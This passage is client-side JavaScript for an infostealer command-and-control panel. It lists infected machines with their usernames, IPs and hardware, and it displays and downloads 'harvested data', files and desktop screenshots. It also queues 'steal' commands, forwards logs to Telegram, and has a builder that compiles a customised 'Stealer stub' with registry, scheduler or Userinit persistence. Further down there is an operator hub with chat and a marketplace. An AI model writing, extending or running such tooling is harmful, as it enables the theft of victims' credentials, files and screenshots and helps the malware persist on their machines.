        container.innerHTML = `<div class="empty-state py-8">Loading client list...</div>`;
        document.getElementById('bulk-actions').classList.remove('visible');
    }

    try {
        const [logsRes, c2Res] = await Promise.all([
            fetch(`/api/logs?page=${currentPage}&limit=${logsLimit}&search=${encodeURIComponent(searchQuery)}`),
            fetch('/api/c2/clients')
        ]);
        const data = await logsRes.json();
        const c2Clients = await c2Res.json();

        const onlineSet = new Set();
        c2Clients.forEach(c => { if (c.is_online) onlineSet.add(c.client_id); });

        const loggedClientIds = new Set(data.logs ? data.logs.map(l => l.hostname + '_' + l.username) : []);
        const c2OnlyClients = c2Clients.filter(c => !loggedClientIds.has(c.client_id));

        const expectedLogIds = new Set(data.logs ? data.logs.map(l => String(l.id)) : []);
        const expectedC2Ids = new Set(c2OnlyClients.map(c => c.client_id));

        // Remove stale rows
        container.querySelectorAll('[data-log-id]').forEach(row => {
            if (!expectedLogIds.has(row.dataset.logId)) row.remove();
        });
        container.querySelectorAll('[data-c2-id]').forEach(row => {
            if (!expectedC2Ids.has(row.dataset.c2Id)) row.remove();
        });
        container.querySelectorAll('.empty-state').forEach(el => el.remove());

        // Update or add C2-only rows (prepend so they appear first)
        c2OnlyClients.forEach(c => {
            const existing = container.querySelector(`[data-c2-id="${CSS.escape(c.client_id)}"]`);
            if (existing) {
                const pill = existing.querySelector('.client-status-pill');
                if (pill) {
                    pill.className = `client-status-pill ${c.is_online ? 'status-online' : 'status-offline'}`;
                    const txt = pill.querySelector('.status-text');
                    if (txt) txt.textContent = c.is_online ? 'Online' : 'Offline';
                }
            } else {
                const firstLog = container.querySelector('[data-log-id]');
                container.insertBefore(renderC2OnlyRow(c, c.is_online), firstLog || null);
            }
        });

        // Update or add log rows
        if (data.logs) {
            data.logs.forEach(log => {
                const clientId = log.hostname + '_' + log.username;
                const isOnline = onlineSet.has(clientId);
                const existing = container.querySelector(`[data-log-id="${log.id}"]`);
                if (existing) {
                    const pill = existing.querySelector('.client-status-pill');
                    if (pill) {
                        pill.className = `client-status-pill ${isOnline ? 'status-online' : 'status-offline'}`;
                        const txt = pill.querySelector('.status-text');
                        if (txt) txt.textContent = isOnline ? 'Online' : 'Offline';
                    }
                } else {
                    container.appendChild(renderClientRow(log, isOnline));
                }
            });
        }

        if (container.children.length === 0) {
            container.innerHTML = `<div class="empty-state py-8">No clients found.</div>`;
        }

        document.getElementById('current-page').innerText = data.page || 1;
        document.getElementById('total-pages').innerText = data.totalPages || 1;
        document.getElementById('prev-page-btn').disabled = !data.page || data.page <= 1;
        document.getElementById('next-page-btn').disabled = !data.page || data.page >= data.totalPages;

    } catch (err) {
        console.error('Error loading clients:', err);
        if (isFirstLoad) {
            container.innerHTML = `<div class="empty-state py-8 text-danger">Failed to load clients.</div>`;
        }
    }
}

// 3. Inspect details in Modal
async function viewLogDetails(id) {
    try {
        currentViewLogId = id;
        closeFileViewer();

        const response = await fetch(`/api/logs/${id}`);
        if (!response.ok) throw new Error('Failed to load log details');

        const { log, files } = await response.json();

        document.getElementById('modal-title').innerText = `${log.username} @ ${log.hostname}`;
        document.getElementById('modal-subtitle').innerText = `Received: ${formatDate(log.created_at)}`;

        // Populate metadata (no emojis!)
        const metaGrid = document.getElementById('modal-meta-grid');
        metaGrid.innerHTML = `
            <div class="meta-item">
                <span class="meta-label">Username</span>
                <span class="meta-val">${escapeHtml(log.username)}</span>
            </div>
            <div class="meta-item">
                <span class="meta-label">Hostname</span>
                <span class="meta-val">${escapeHtml(log.hostname)}</span>
            </div>
            <div class="meta-item">
                <span class="meta-label">IP Address</span>
                <span class="meta-val">${getFlagHtml(log.country_code)}${log.ip}</span>
            </div>
            <div class="meta-item">
                <span class="meta-label">OS Version</span>
                <span class="meta-val">${escapeHtml(log.os)}</span>
            </div>
            <div class="meta-item" style="grid-column: span 2;">
                <span class="meta-label">Processor</span>
                <span class="meta-val">${escapeHtml(log.cpu)}</span>
            </div>
            <div class="meta-item">
                <span class="meta-label">RAM Amount</span>
                <span class="meta-val">${formatRAM(log.ram)}</span>
            </div>
            <div class="meta-item">
                <span class="meta-label">Local Time</span>
                <span class="meta-val">${log.date_time || 'Unknown'}</span>
            </div>
        `;

        // Populate Files as tree
        const fileList = document.getElementById('modal-file-list');
        const tree = buildFileTree(files);
        const treeHtml = renderFileTree(tree, 0);
        if (treeHtml) {
            fileList.innerHTML = treeHtml;
        } else {
            fileList.innerHTML = '<li class="file-item empty-state">No stolen content found.</li>';
        }

        // Set Screenshot
        const screenshotContainer = document.getElementById('modal-screenshot-container');
        if (log.has_screenshot) {
            const scUrl = log.screenshot_b64 || `/api/logs/${id}/screenshot`;
            screenshotContainer.innerHTML = `<img src="${scUrl}" alt="Desktop Screenshot" onclick="window.open(this.src)">`;
        } else {
            screenshotContainer.innerHTML = `<div class="empty-state">No screenshot captured.</div>`;
        }

        // Action Buttons Setup
        document.getElementById('modal-download-btn').href = `/api/logs/${id}/download`;
        
        const deleteBtn = document.getElementById('modal-delete-btn');
        const newDeleteBtn = deleteBtn.cloneNode(true);
        deleteBtn.parentNode.replaceChild(newDeleteBtn, deleteBtn);
        newDeleteBtn.addEventListener('click', () => {
            showDialog({
                title: 'Delete Log',
                message: `Remove all harvested data for ${log.username}@${log.hostname}? This cannot be undone.`,
                type: 'danger',
                confirmText: 'Delete',
                onConfirm: async () => {
                    await deleteLog(id);
                    closeModal();
                    loadClients();
                }
            });
        });

        document.getElementById('details-modal').classList.add('active');
    } catch (err) {
        showAlert('Error', err.message);
    }
}

async function deleteLog(id) {
    try {
        await fetch(`/api/logs/${id}`, { method: 'DELETE' });
    } catch (err) {
        console.error(err);
    }
}

function quickDeleteLog(id, btnEl) {
    const row = btnEl.closest('.client-row');
    const username = row ? row.querySelector('.client-info-user strong')?.innerText : '';
    showDialog({
        title: 'Delete Log',
        message: username ? `Remove log for ${username}?` : 'Remove this log?',
        type: 'danger',
        confirmText: 'Delete',
        onConfirm: async () => {
            await deleteLog(id);
            if (row) {
                row.style.opacity = '0';
                row.style.transform = 'translateX(40px)';
                row.style.transition = 'all 0.3s ease';
                setTimeout(() => {
                    row.remove();
                    updateBulkActions();
                }, 300);
            }
        }
    });
}

// C2 Command
async function sendStealCommand(clientId) {
    try {
        const res = await fetch('/api/c2/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ client_id: clientId, command: 'steal' })
        });
        if (res.ok) {
            showToast('Command sent', `Steal command queued for ${clientId}`);
        }
    } catch (e) {
        console.error('Failed to send command:', e);
    }
}

// Profile
function loadProfileUI() {
    document.getElementById('profile-username').value = currentUser.username || '';
    document.getElementById('profile-display-name').value = currentUser.display_name || '';
    if (currentUser.avatar) {
        document.getElementById('profile-avatar-img').src = currentUser.avatar;
        document.getElementById('profile-avatar-img').style.display = 'block';
        document.getElementById('profile-avatar-icon').style.display = 'none';
        document.getElementById('remove-avatar-btn').style.display = 'block';
    }
    const overlay = document.getElementById('avatar-overlay');
    const preview = document.getElementById('profile-avatar-preview');
    if (overlay && preview) {
        preview.onmouseenter = () => overlay.style.opacity = '1';
        preview.onmouseleave = () => overlay.style.opacity = '0';
    }
}

window.saveProfile = async function() {
    const username = document.getElementById('profile-username').value.trim();
    const display_name = document.getElementById('profile-display-name').value.trim();
    const current_password = document.getElementById('profile-current-password').value;
    const new_password = document.getElementById('profile-new-password').value;
    const status = document.getElementById('profile-status');

    const body = { username, display_name };
    if (new_password) { body.current_password = current_password; body.new_password = new_password; }

    status.style.color = 'var(--text-muted)';
    status.textContent = 'Saving...';
    try {
        const res = await fetch('/api/profile', { method: 'PATCH', headers: {'Content-Type':'application/json'}, body: JSON.stringify(body) });
        const data = await res.json();
        if (!res.ok) { status.style.color = 'var(--accent-red)'; status.textContent = data.error; return; }
        currentUser.username = username;
        currentUser.display_name = display_name;
        updateSidebarUser(currentUser);
        document.getElementById('profile-current-password').value = '';
        document.getElementById('profile-new-password').value = '';
        status.style.color = 'var(--accent-green)';
        status.textContent = 'Saved.';
        setTimeout(() => status.textContent = '', 3000);
    } catch(e) {
        status.style.color = 'var(--accent-red)';
        status.textContent = 'Error saving profile.';
    }
};

window.uploadAvatar = async function(input) {
    const file = input.files[0];
    if (!file) return;
    const form = new FormData();
    form.append('avatar', file);
    const status = document.getElementById('profile-status');
    status.style.color = 'var(--text-muted)';
    status.textContent = 'Uploading...';
    try {
        const res = await fetch('/api/profile/avatar', { method: 'POST', body: form });
        const data = await res.json();
        if (!res.ok) { status.style.color = 'var(--accent-red)'; status.textContent = data.error; return; }
        currentUser.avatar = data.avatar;
        document.getElementById('profile-avatar-img').src = data.avatar + '?t=' + Date.now();
        document.getElementById('profile-avatar-img').style.display = 'block';
        document.getElementById('profile-avatar-icon').style.display = 'none';
        document.getElementById('remove-avatar-btn').style.display = 'block';
        updateSidebarUser(currentUser);
        status.style.color = 'var(--accent-green)';
        status.textContent = 'Avatar updated.';
        setTimeout(() => status.textContent = '', 3000);
    } catch(e) {
        status.style.color = 'var(--accent-red)';
        status.textContent = 'Upload failed.';
    }
    input.value = '';
};

window.removeAvatar = async function() {
    const status = document.getElementById('profile-status');
    try {
        await fetch('/api/profile/avatar', { method: 'DELETE' });
        currentUser.avatar = '';
        document.getElementById('profile-avatar-img').style.display = 'none';
        document.getElementById('profile-avatar-icon').style.display = 'block';
        document.getElementById('remove-avatar-btn').style.display = 'none';
        updateSidebarUser(currentUser);
        status.style.color = 'var(--accent-green)';
        status.textContent = 'Avatar removed.';
        setTimeout(() => status.textContent = '', 3000);
    } catch(e) {}
};

// 4. Settings Loader & Saver
async function loadSettings() {
    try {
        const response = await fetch('/api/settings');
        const settings = await response.json();

        document.getElementById('tg-enable-checkbox').checked = settings.tg_forward_enabled === 'true';
        document.getElementById('tg-token-input').value = settings.tg_bot_token || '';
        document.getElementById('tg-chat-input').value = settings.tg_chat_id || '';

        // Load panel preferences from localStorage
        const soundEnabled = localStorage.getItem('sound_alerts_enabled') !== 'false';
        document.getElementById('sound-alerts-checkbox').checked = soundEnabled;

        // Load custom background and blur value
        const customBg = settings.custom_bg_path || '';
        const blurValue = settings.bg_blur_value || '15';
        const activeTheme = settings.active_bg_theme || 'theme-default';

        // Apply blur
        document.getElementById('bg-blur-slider').value = blurValue;
        applyBlurValue(blurValue);

        if (customBg) {
            applyCustomBackground(customBg);
        } else {
            // Apply stored theme class (only when no custom bg)
            document.body.className = activeTheme;
        }

        // Activate theme button highlights
        document.querySelectorAll('.theme-selector').forEach(sel => {
            if (sel.getAttribute('data-theme') === activeTheme) {
                sel.classList.add('active');
            } else {
                sel.classList.remove('active');
            }
        });
    } catch (err) {
        console.error('Error loading settings:', err);
    }
}

document.getElementById('save-settings-btn').addEventListener('click', async () => {
    const status = document.getElementById('save-status');
    status.className = 'save-status';
    status.innerText = 'Saving...';

    try {
        const body = {
            tg_forward_enabled: document.getElementById('tg-enable-checkbox').checked,
            tg_bot_token: document.getElementById('tg-token-input').value.trim(),
            tg_chat_id: document.getElementById('tg-chat-input').value.trim()
        };

        const res = await fetch('/api/settings', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });

        if (res.ok) {
            status.className = 'save-status success';
            status.innerText = 'Settings saved successfully!';
        } else {
            throw new Error('Save failed');
        }
    } catch (err) {
        status.className = 'save-status error';
        status.innerText = 'Error: ' + err.message;
    }
});

// --- Builder Client compiler ---
// Persistence dropdown
(function() {
    const toggle = document.getElementById('persistence-toggle');
    const dropdown = document.getElementById('persistence-dropdown');
    const label = document.getElementById('persistence-label');
    const noneCheck = document.getElementById('persist-none');
    const methodChecks = dropdown.querySelectorAll('input[type="checkbox"]:not(#persist-none)');

    toggle.addEventListener('click', (e) => {
        e.stopPropagation();
        dropdown.classList.toggle('open');
    });

    document.addEventListener('click', () => dropdown.classList.remove('open'));
    dropdown.addEventListener('click', (e) => e.stopPropagation());

    noneCheck.addEventListener('change', () => {
        if (noneCheck.checked) {
            methodChecks.forEach(c => { c.checked = false; });
        }
        updateLabel();
    });

    methodChecks.forEach(c => {
        c.addEventListener('change', () => {
            if (c.checked) noneCheck.checked = false;
            updateLabel();
        });
    });

    function updateLabel() {
        if (noneCheck.checked) { label.textContent = 'None'; return; }
        const selected = Array.from(methodChecks).filter(c => c.checked).map(c => {
            if (c.value === 'registry') return 'Registry';
            if (c.value === 'scheduler') return 'Scheduler';
            if (c.value === 'userinit') return 'Userinit';
            return c.value;
        });
        label.textContent = selected.length === 3 ? 'All Methods' : selected.length === 0 ? 'None' : selected.join(', ');
        if (selected.length === 0) noneCheck.checked = true;
    }
})();

document.getElementById('btn-build-stub').addEventListener('click', async () => {
    const consoleBox = document.getElementById('build-console');
    consoleBox.innerHTML = '';

    const log = (text, type = 'info') => {
        const span = document.createElement('span');
        span.className = `log-${type}`;
        span.innerText = `[${new Date().toLocaleTimeString()}] ${text}`;
        consoleBox.appendChild(span);
        consoleBox.scrollTop = consoleBox.scrollHeight;
    };

    const delivery = document.querySelector('input[name="build-delivery"]:checked').value;
    const botToken = document.getElementById('build-tg-token').value.trim();
    const chatId = document.getElementById('build-tg-chat').value.trim();
    const panelUrl = window.location.origin + '/api/upload';
    const secretKey = currentUser.api_key || '';

    const persistChecks = document.querySelectorAll('#persistence-dropdown input[type="checkbox"]:checked');
    const persistMethods = Array.from(persistChecks).map(c => c.value).filter(v => v !== 'none');
    const persistence = document.getElementById('persist-none').checked ? 'none' : persistMethods.join(',') || 'none';

    // Validation
    if (delivery === 'TELEGRAM') {
        if (!botToken || !chatId) {
            log('Error: Telegram Bot Token and Chat ID are required!', 'error');
            return;
        }
    }

    log('Initializing compilation payload...', 'info');
    log(`Delivery target selected: ${delivery}`, 'warning');
    log(`Persistence: ${persistence}`, 'info');
    log('Contacting Python builder engine API...', 'info');

    try {
        const res = await fetch('/api/build', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ delivery, botToken, chatId, panelUrl, secretKey, persistence })
        });

        const data = await res.json();
        
        if (!res.ok) {
            throw new Error(data.error || 'Build api failed');
        }

        log('Stub base binary template loaded...', 'info');
        log('Patching binary structure configurations...', 'warning');
        log('Recalculating PE header checks...', 'info');
        log('Custom client generated successfully!', 'success');
        log('Downloading customized Stealer stub file...', 'success');

        // Direct browser file download
        window.location.href = data.downloadUrl;

    } catch (err) {
        log(`Compilation Error: ${err.message}`, 'error');
    }
});

// --- Modal Helper Functions ---
function closeModal() {
    document.getElementById('details-modal').classList.remove('active');
}
document.getElementById('modal-close-btn').addEventListener('click', closeModal);
document.getElementById('file-viewer-close').addEventListener('click', closeFileViewer);
document.querySelector('.modal-backdrop').addEventListener('click', closeModal);

// Pagination
document.getElementById('prev-page-btn').addEventListener('click', () => {
    if (currentPage > 1) {
        currentPage--;
        loadClients();
    }
});
document.getElementById('next-page-btn').addEventListener('click', () => {
    currentPage++;
    loadClients();
});

// Search
document.getElementById('search-input').addEventListener('input', (e) => {
    clearTimeout(searchTimeout);
    searchTimeout = setTimeout(() => {
        searchQuery = e.target.value.trim();
        currentPage = 1;
        loadClients();
    }, 450);
});

document.getElementById('refresh-logs-btn').addEventListener('click', () => {
    loadClients();
});


// Bulk Actions
document.getElementById('bulk-download-btn').addEventListener('click', () => {
    const ids = getSelectedLogIds();
    if (ids.length === 0) return;
    ids.forEach(id => {
        const a = document.createElement('a');
        a.href = `/api/logs/${id}/download`;
        a.download = '';
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        setTimeout(() => a.remove(), 100);
    });
});

document.getElementById('bulk-delete-btn').addEventListener('click', () => {
    const logIds = getSelectedLogIds();
    const clientIds = getSelectedClientIds();
    const total = document.querySelectorAll('.client-checkbox input[type="checkbox"]:checked').length;
    if (total === 0) return;
    showDialog({
        title: 'Bulk Delete',
        message: `Delete ${total} selected item(s)? This cannot be undone.`,
        type: 'danger',
        confirmText: `Delete ${total}`,
        onConfirm: async () => {
            for (const id of logIds) {
                await deleteLog(id);
            }
            const uniqueClients = [...new Set(clientIds)];
            for (const cid of uniqueClients) {
                try {
                    await fetch('/api/c2/clients/' + encodeURIComponent(cid), { method: 'DELETE' });
                } catch {}
            }
            loadClients();
            showToast('Bulk delete complete', `${total} item(s) removed`);
        }
    });
});

// Delete Offline Clients
document.getElementById('delete-offline-btn').addEventListener('click', () => {
    showDialog({
        title: 'Clear Offline Clients',
        message: 'Are you sure you want to remove all offline clients from the list?',
        type: 'danger',
        confirmText: 'Clear Offline',
        onConfirm: async () => {
            try {
                const res = await fetch('/api/c2/clients/offline', { method: 'DELETE' });
                const data = await res.json();
                showToast('Offline Clients Cleared', `Removed ${data.deleted || 0} offline client(s)`);
                loadClients();
            } catch (err) {
                showAlert('Error', err.message);
            }
        }
    });
});

// Sound & Auto-refresh settings listeners
document.getElementById('sound-alerts-checkbox').addEventListener('change', (e) => {
    localStorage.setItem('sound_alerts_enabled', e.target.checked);
});


// Custom Dialog System
function showDialog({ title, message, type, confirmText, cancelText, onConfirm }) {
    const overlay = document.getElementById('dialog-overlay');
    const iconEl = document.getElementById('dialog-icon');
    const titleEl = document.getElementById('dialog-title');
    const msgEl = document.getElementById('dialog-message');
    const actionsEl = document.getElementById('dialog-actions');

    const icons = {
        danger: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>`,
        warning: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>`,
        error: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>`
    };

    const iconType = type || 'warning';
    iconEl.className = `dialog-icon icon-${iconType}`;
    iconEl.innerHTML = icons[iconType] || icons.warning;
    titleEl.innerText = title;
    msgEl.innerHTML = message;

    if (onConfirm) {
        actionsEl.innerHTML = `
            <button class="btn btn-outline" id="dialog-cancel">${cancelText || 'Cancel'}</button>
            <button class="btn btn-primary" id="dialog-confirm" style="${iconType === 'danger' ? 'background: var(--accent-red); border-color: var(--accent-red);' : ''}">${confirmText || 'Confirm'}</button>
        `;
        document.getElementById('dialog-cancel').onclick = () => closeDialog();
        document.getElementById('dialog-confirm').onclick = () => { closeDialog(); onConfirm(); };
    } else {
        actionsEl.innerHTML = `<button class="btn btn-primary" id="dialog-ok">OK</button>`;
        document.getElementById('dialog-ok').onclick = () => closeDialog();
    }

    overlay.classList.add('active');

    overlay.onclick = (e) => {
        if (e.target === overlay) closeDialog();
    };
}

function closeDialog() {
    document.getElementById('dialog-overlay').classList.remove('active');
}

function showAlert(title, message) {
    showDialog({ title, message, type: 'error' });
}

// Toast Notification System
function showToast(title, description, duration = 5000) {
    const container = document.getElementById('toast-container');

    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.innerHTML = `
        <div class="toast-icon-box">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
                <polyline points="14 2 14 8 20 8"/>
                <line x1="16" y1="13" x2="8" y2="13"/>
                <line x1="16" y1="17" x2="8" y2="17"/>
                <polyline points="10 9 9 9 8 9"/>
            </svg>
        </div>
        <div class="toast-body">
            <span class="toast-title">${escapeHtml(title)}</span>
            <span class="toast-desc">${escapeHtml(description)}</span>
            <span class="toast-time">just now</span>
        </div>
        <div class="toast-progress">
            <div class="toast-progress-bar" style="animation-duration: ${duration}ms;"></div>
        </div>
    `;

    toast.addEventListener('click', () => dismissToast(toast));
    container.appendChild(toast);

    setTimeout(() => dismissToast(toast), duration);
}

function dismissToast(toast) {
    if (toast.classList.contains('toast-exit')) return;
    toast.classList.add('toast-exit');
    setTimeout(() => toast.remove(), 350);
}

// Helpers
function escapeHtml(text) {
    if (!text) return '';
    return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
}

function formatDate(isoString) {
    if (!isoString) return 'N/A';
    try {
        const d = new Date(isoString.replace(' ', 'T') + (isoString.includes('Z') ? '' : 'Z'));
        if (isNaN(d.getTime())) return isoString;
        const dd = String(d.getDate()).padStart(2, '0');
        const mm = String(d.getMonth() + 1).padStart(2, '0');
        const yy = d.getFullYear();
        const hh = String(d.getHours()).padStart(2, '0');
        const min = String(d.getMinutes()).padStart(2, '0');
        const ss = String(d.getSeconds()).padStart(2, '0');
        return `${dd}.${mm}.${yy} ${hh}:${min}:${ss}`;
    } catch {
        return isoString;
    }
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// ═══════════════════════════════════════
// LIQUID GLASS — Cursor Tracking Engine
// ═══════════════════════════════════════
(function liquidGlassInit() {
    let rafId = null;
    let mouseX = 0, mouseY = 0;

    document.addEventListener('mousemove', (e) => {
        mouseX = e.clientX;
        mouseY = e.clientY;

        if (!rafId) {
            rafId = requestAnimationFrame(() => {
                updateGlassElements();
                rafId = null;
            });
        }
    });

    function updateGlassElements() {
        const els = document.querySelectorAll('.liquid-glass');
        for (let i = 0; i < els.length; i++) {
            const el = els[i];
            const rect = el.getBoundingClientRect();

            if (rect.bottom < -100 || rect.top > window.innerHeight + 100 ||
                rect.right < -100 || rect.left > window.innerWidth + 100) continue;

            const lx = Math.max(0, Math.min(1, (mouseX - rect.left) / rect.width));
            const ly = Math.max(0, Math.min(1, (mouseY - rect.top) / rect.height));

            el.style.setProperty('--lx', lx.toFixed(3));
            el.style.setProperty('--ly', ly.toFixed(3));
        }
    }

    // Auto-apply liquid-glass to dynamically created client rows & admin stats
    const observer = new MutationObserver((mutations) => {
        for (const mut of mutations) {
            for (const node of mut.addedNodes) {
                if (node.nodeType !== 1) continue;
                if (node.classList && node.classList.contains('client-row')) {
                    node.classList.add('liquid-glass');
                }
                if (node.classList && node.classList.contains('admin-stat')) {
                    node.classList.add('liquid-glass');
                }
                if (node.classList && node.classList.contains('toast')) {
                    node.classList.add('liquid-glass');
                }
                const children = node.querySelectorAll ? node.querySelectorAll('.client-row, .admin-stat, .toast') : [];
                children.forEach(child => child.classList.add('liquid-glass'));
            }
        }
    });

    observer.observe(document.body, { childList: true, subtree: true });
})();

// ── HUB ──────────────────────────────────────────────────────────────────────

let hubCurrentUser = null;
let chatPollInterval = null;
let chatLastId = 0;
let hubActiveSubtab = 'announcements';
let mktActiveCategory = 'Clients';

let hubSetupDone = false;
function loadHub() {
    fetchCurrentUserForHub().then(() => {
        if (!hubSetupDone) {
            hubSetupDone = true;
            setupAnnDrawer();
            setupHubSubtabs();
            setupHubChatInput();
            setupHubMarketplaceInput();
        }
        switchHubSubtab(hubActiveSubtab);
    });
}

async function fetchCurrentUserForHub() {
    try {
        const r = await fetch('/api/profile');
        if (r.ok) hubCurrentUser = await r.json();
    } catch(e) {}
}

function setupHubSubtabs() {
    document.querySelectorAll('.hub-subtab-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            switchHubSubtab(btn.dataset.hub);
        });
    });
}

function switchHubSubtab(name) {
    hubActiveSubtab = name;
    document.querySelectorAll('.hub-subtab-btn').forEach(b => b.classList.toggle('active', b.dataset.hub === name));
    document.querySelectorAll('.hub-panel').forEach(p => p.classList.toggle('active', p.id === `hub-${name}`));

    if (chatPollInterval) { clearInterval(chatPollInterval); chatPollInterval = null; }

    if (name === 'announcements') loadAnnouncements();
    else if (name === 'chat') startChat();
    else if (name === 'marketplace') loadMarketplace(mktActiveCategory);
}

// ── Announcements ────────────────────────────────────────────────────────────

function setupAnnDrawer() {
    document.getElementById('hub-ann-open-drawer-btn').addEventListener('click', openAnnDrawer);
    document.getElementById('hub-ann-close-drawer-btn').addEventListener('click', closeAnnDrawer);
    document.getElementById('hub-ann-drawer-backdrop').addEventListener('click', closeAnnDrawer);
    document.getElementById('ann-post-btn').addEventListener('click', postAnnouncement);
}
function openAnnDrawer() {
    document.getElementById('hub-ann-drawer').classList.add('open');
    document.getElementById('hub-ann-drawer-backdrop').classList.add('open');
}
function closeAnnDrawer() {
    document.getElementById('hub-ann-drawer').classList.remove('open');
    document.getElementById('hub-ann-drawer-backdrop').classList.remove('open');
}

async function loadAnnouncements() {
    const list = document.getElementById('hub-ann-list');
    list.innerHTML = '<div class="hub-empty">Loading...</div>';

    if (hubCurrentUser?.role === 'admin') {
        document.getElementById('hub-ann-toolbar').style.display = 'flex';
    }

    try {
        const r = await fetch('/api/hub/announcements');
        const items = await r.json();
        list.innerHTML = '';
        if (!items.length) { list.innerHTML = '<div class="hub-empty">No announcements yet.</div>'; return; }
        items.forEach(a => list.appendChild(buildAnnCard(a)));
    } catch(e) {
        list.innerHTML = '<div class="hub-empty">Failed to load announcements.</div>';
    }
}

function buildAnnCard(a) {
    const div = document.createElement('div');
    div.className = 'hub-ann-item' + (a.pinned ? ' pinned' : '');
    const authorName = a.author_display || a.author;
    const avatarHtml = buildAvatarHtml(a.author_avatar, a.author_display || a.author, 36);
    div.innerHTML = `
        <div class="hub-ann-item-header">
            ${a.pinned ? '<span class="hub-ann-pin-badge">Pinned</span>' : ''}
            <span class="hub-ann-title">${escHtml(a.title)}</span>
        </div>
        <div class="hub-ann-meta" style="display:flex;align-items:center;gap:7px;">
            ${avatarHtml}
            <span style="font-weight:600;color:var(--primary);">${escHtml(authorName)}</span>
            <span>&middot;</span>
            <span>${fmtDate(a.created_at)}</span>
        </div>
        <div class="hub-ann-body">${escHtml(a.body)}</div>
    `;
    if (hubCurrentUser?.role === 'admin') {
        const del = document.createElement('button');
        del.className = 'hub-ann-delete'; del.textContent = '×';
        del.onclick = () => deleteAnnouncement(a.id, div);
        div.appendChild(del);
    }
    return div;
}

async function postAnnouncement() {
    const title = document.getElementById('ann-title-input').value.trim();
    const body = document.getElementById('ann-body-input').value.trim();
    const pinned = document.getElementById('ann-pinned-check').checked;
    if (!title || !body) return;
    await fetch('/api/hub/announcements', {
        method: 'POST', headers: {'Content-Type':'application/json'},
        body: JSON.stringify({title, body, pinned})
    });
    document.getElementById('ann-title-input').value = '';
    document.getElementById('ann-body-input').value = '';
    document.getElementById('ann-pinned-check').checked = false;
    closeAnnDrawer();
    loadAnnouncements();
}

async function deleteAnnouncement(id, el) {
    await fetch(`/api/hub/announcements/${id}`, {method:'DELETE'});
    el.remove();
}

// ── Chat ─────────────────────────────────────────────────────────────────────

function setupHubChatInput() {
    document.getElementById('hub-chat-send-btn').addEventListener('click', sendChatMessage);
    document.getElementById('hub-chat-input').addEventListener('keydown', e => {
        if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); sendChatMessage(); }
    });
}

function startChat() {
    chatLastId = 0;
    document.getElementById('hub-chat-messages').innerHTML = '';
    fetchChatMessages(true);
    chatPollInterval = setInterval(() => fetchChatMessages(false), 3000);
}

async function fetchChatMessages(scrollToBottom) {
    try {
        const r = await fetch(`/api/hub/chat?since=${chatLastId}`);
        const msgs = await r.json();
        if (!msgs.length) return;
        const container = document.getElementById('hub-chat-messages');
        const atBottom = container.scrollHeight - container.scrollTop <= container.clientHeight + 60;
        appendTgMessages(container, msgs, chatLastId);
        msgs.forEach(m => { chatLastId = Math.max(chatLastId, m.id); });
        if (atBottom || scrollToBottom) container.scrollTop = container.scrollHeight;
    } catch(e) {}
}

async function sendChatMessage() {
    const input = document.getElementById('hub-chat-input');
    const message = input.value.trim();
    if (!message) return;
    input.value = '';
    try {
        await fetch('/api/hub/chat', {
            method: 'POST', headers: {'Content-Type':'application/json'},
            body: JSON.stringify({message})
        });
        fetchChatMessages(true);
    } catch(e) {}
}

// ── Marketplace ───────────────────────────────────────────────────────────────

let threadPollInterval = null;
let threadCurrentItem = null;

function setupHubMarketplaceInput() {
    document.querySelectorAll('.hub-cat-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            mktActiveCategory = btn.dataset.cat;
            document.querySelectorAll('.hub-cat-btn').forEach(b => b.classList.toggle('active', b === btn));
            loadMarketplace(mktActiveCategory);
        });
    });

    // Drawer open/close
    document.getElementById('hub-mkt-open-drawer-btn').addEventListener('click', openMktDrawer);
    document.getElementById('hub-mkt-close-drawer-btn').addEventListener('click', closeMktDrawer);
    document.getElementById('hub-mkt-drawer-backdrop').addEventListener('click', closeMktDrawer);

    document.getElementById('mkt-post-btn').addEventListener('click', createListing);

    // Thread back
    document.getElementById('hub-mkt-back-btn').addEventListener('click', closeMktThread);

    // Thread send
    document.getElementById('hub-mkt-thread-send').addEventListener('click', sendThreadMessage);
    document.getElementById('hub-mkt-thread-input').addEventListener('keydown', e => {
        if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); sendThreadMessage(); }
    });
}

function openMktDrawer() {
    document.getElementById('hub-mkt-drawer').classList.add('open');
    document.getElementById('hub-mkt-drawer-backdrop').classList.add('open');
}
function closeMktDrawer() {
